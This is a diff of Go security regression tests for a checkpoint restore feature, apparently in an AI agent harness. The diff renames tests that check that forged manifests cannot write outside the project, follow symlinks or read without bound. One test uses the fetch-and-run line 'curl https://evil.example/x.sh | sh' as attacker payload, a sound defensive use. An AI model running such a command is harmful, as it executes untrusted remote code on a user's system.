@@ -3,7 +3,7 @@ package checkpoint
 // Security regression tests for docs/reviews/security-robustness.md (S37, part of F12):
 // a checkpoint manifest is data an attacker may have written, so nothing in it may
 // steer Restore or Diff outside the project, and nothing in it may make them read or
-// write without bound. TestSecReview_S37* began as a repro that failed while the finding
+// write without bound. TestSec_S37* began as a repro that failed while the finding
 // was open. TestSecSound_* pin behaviour the review found sound.
 
 import (
@@ -89,7 +89,7 @@ func (f *forge) mustNotExist(path string) {
 // directory lives under the project (.sleipnir/ is ignored by this repo's .gitignore but is not
 // protected from the agent's write tools, and a hostile repository can ship its own), Restore
 // ("rewind") wrote attacker content to attacker-chosen absolute paths with the harness's privileges.
-func TestSecReview_S37_ForgedManifestRestoreWritesOutsideTheProject(t *testing.T) {
+func TestSec_S37_ForgedManifestRestoreWritesOutsideTheProject(t *testing.T) {
 	f := newForge(t)
 	payload := "curl https://evil.example/x.sh | sh\n"
 	h, _ := f.blob(payload)
@@ -106,7 +106,7 @@ func TestSecReview_S37_ForgedManifestRestoreWritesOutsideTheProject(t *testing.T
 
 // Every way a forged key can point out of the project is refused at load, with the same
 // result: nothing written, nothing read, a warning naming the record.
-func TestSecReview_S37_EveryEscapingKeyIsDropped(t *testing.T) {
+func TestSec_S37_EveryEscapingKeyIsDropped(t *testing.T) {
 	f := newForge(t)
 	rel, err := filepath.Rel(f.root, f.victim)
 	if err != nil {
@@ -140,7 +140,7 @@ func TestSecReview_S37_EveryEscapingKeyIsDropped(t *testing.T) {
 
 // A saved file without both hashes cannot be rewound: the checksum is what stands between a
 // forged blob reference and a write, so a record without one is dropped, not trusted.
-func TestSecReview_S37_ARecordNeedsHashesAndSaneFields(t *testing.T) {
+func TestSec_S37_ARecordNeedsHashesAndSaneFields(t *testing.T) {
 	f := newForge(t)
 	h, size := f.blob("content")
 	rec := func(pre string) string {
@@ -189,7 +189,7 @@ func TestSecReview_S37_ARecordNeedsHashesAndSaneFields(t *testing.T) {
 // project and then "restores" a file beneath it must not write through it. The path is
 // resolved again at the moment of writing, so what an earlier step of the same rewind
 // created is seen.
-func TestSecReview_S37_ASymlinkPlantedByTheRewindItselfIsNotFollowed(t *testing.T) {
+func TestSec_S37_ASymlinkPlantedByTheRewindItselfIsNotFollowed(t *testing.T) {
 	if runtime.GOOS == "windows" {
 		t.Skip("symlinks")
 	}
@@ -219,7 +219,7 @@ func TestSecReview_S37_ASymlinkPlantedByTheRewindItselfIsNotFollowed(t *testing.
 
 // A symlink that appears where a directory was, after the checkpoint, is not followed either:
 // the rewind (and Diff) refuse the path instead of reaching through the link.
-func TestSecReview_S37_ADirectoryReplacedByASymlinkAfterTheCheckpointIsRefused(t *testing.T) {
+func TestSec_S37_ADirectoryReplacedByASymlinkAfterTheCheckpointIsRefused(t *testing.T) {
 	if runtime.GOOS == "windows" {
 		t.Skip("symlinks")
 	}
@@ -259,7 +259,7 @@ func TestSecReview_S37_ADirectoryReplacedByASymlinkAfterTheCheckpointIsRefused(t
 
 // Directory names a manifest says a tool created are removed when empty; a forged one must not be
 // a way to rmdir somewhere else.
-func TestSecReview_S37_ForgedNewDirsCannotRemoveDirectoriesElsewhere(t *testing.T) {
+func TestSec_S37_ForgedNewDirsCannotRemoveDirectoriesElsewhere(t *testing.T) {
 	f := newForge(t)
 	victimDir := filepath.Join(f.base, "home", "empty-dir-that-must-stay")
 	if err := os.MkdirAll(victimDir, 0o755); err != nil {
@@ -292,7 +292,7 @@ func TestSecReview_S37_ForgedNewDirsCannotRemoveDirectoriesElsewhere(t *testing.
 
 // Content is bounded on the way back: a record cannot make Restore read a blob over the store's cap
 // into memory (whatever size it claims), and one rewind writes at most maxRestoreBytes.
-func TestSecReview_S37_RestoreOfHugeContentIsBounded(t *testing.T) {
+func TestSec_S37_RestoreOfHugeContentIsBounded(t *testing.T) {
 	f := newForge(t)
 	s := f.open()
 	s.maxBytes = 1024
@@ -336,7 +336,7 @@ func TestSecReview_S37_RestoreOfHugeContentIsBounded(t *testing.T) {
 
 // A blob whose content does not match the record's checksum is refused, and so is one the store itself
 // flags as damaged. The file stays as it was.
-func TestSecReview_S37_TamperedOrMismatchedBlobsAreNotWritten(t *testing.T) {
+func TestSec_S37_TamperedOrMismatchedBlobsAreNotWritten(t *testing.T) {
 	base := t.TempDir()
 	root := filepath.Join(base, "project")
 	if err := os.MkdirAll(root, 0o755); err != nil {
@@ -379,7 +379,7 @@ func TestSecReview_S37_TamperedOrMismatchedBlobsAreNotWritten(t *testing.T) {
 
 // The manifest files themselves are read with bounds: a huge one, a symlink and a FIFO are skipped with a
 // warning (and keep their number), never read whole or waited on.
-func TestSecReview_S37_ManifestFilesAreReadWithBounds(t *testing.T) {
+func TestSec_S37_ManifestFilesAreReadWithBounds(t *testing.T) {
 	f := newForge(t)
 	old := maxManifestBytes
 	maxManifestBytes = 2048
@@ -407,7 +407,7 @@ func TestSecReview_S37_ManifestFilesAreReadWithBounds(t *testing.T) {
 }
 
 // A hostile file name or counter cannot overflow the id counter.
-func TestSecReview_S37_HugeCheckpointNumbersCannotOverflowTheCounter(t *testing.T) {
+func TestSec_S37_HugeCheckpointNumbersCannotOverflowTheCounter(t *testing.T) {
 	f := newForge(t)
 	for _, name := range []string{"cp_9223372036854775807.json", "cp_99999999999999999999999.json", "cp_2147483648.json"} {
 		if err := os.WriteFile(filepath.Join(f.state, name), []byte(`{}`), 0o600); err != nil {
@@ -428,7 +428,7 @@ func TestSecReview_S37_HugeCheckpointNumbersCannotOverflowTheCounter(t *testing.
 
 // Text that ends up in listings and reports is cleaned: a forged label cannot carry escape sequences or
 // line breaks, and the number of warnings is bounded however much damage there is.
-func TestSecReview_S37_ManifestTextIsCleanedAndWarningsAreBounded(t *testing.T) {
+func TestSec_S37_ManifestTextIsCleanedAndWarningsAreBounded(t *testing.T) {
 	f := newForge(t)
 	var records []string
 	for i := 0; i < 500; i++ {
@@ -460,7 +460,7 @@ func TestSecReview_S37_ManifestTextIsCleanedAndWarningsAreBounded(t *testing.T) 
 
 // State is private to the user: the directory the store creates, its manifests and counter, and its own blob
 // store are 0700/0600.
-func TestSecReview_S37_StateIsPrivate(t *testing.T) {
+func TestSec_S37_StateIsPrivate(t *testing.T) {
 	if runtime.GOOS == "windows" || runtime.GOOS == "plan9" {
 		t.Skip("permission bits are not meaningful here")
 	}
@@ -507,7 +507,7 @@ func TestSecReview_S37_StateIsPrivate(t *testing.T) {
 
 // Files outside the project are recorded by absolute path and can be rewound by the process that
 // recorded them (the design), but such a record is not accepted back from disk.
-func TestSecReview_S37_OutsideRecordsAreRewindableOnlyByTheRecordingProcess(t *testing.T) {
+func TestSec_S37_OutsideRecordsAreRewindableOnlyByTheRecordingProcess(t *testing.T) {
 	e := newEnv(t)
 	outside := filepath.Join(e.base, "elsewhere")
 	if err := os.MkdirAll(outside, 0o755); err != nil {
